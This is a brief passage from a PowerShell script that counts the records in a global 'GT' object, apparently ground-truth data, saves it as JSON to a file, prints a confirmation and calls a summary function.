# Save GT
# ==============================
$Global:GT.total_stages = $Global:GT.records.Count
$Global:GT | ConvertTo-Json -Depth 6 | Out-File $GTPath -Encoding UTF8
Write-Host "GT saved to $GTPath" -ForegroundColor Yellow

Show-Summary
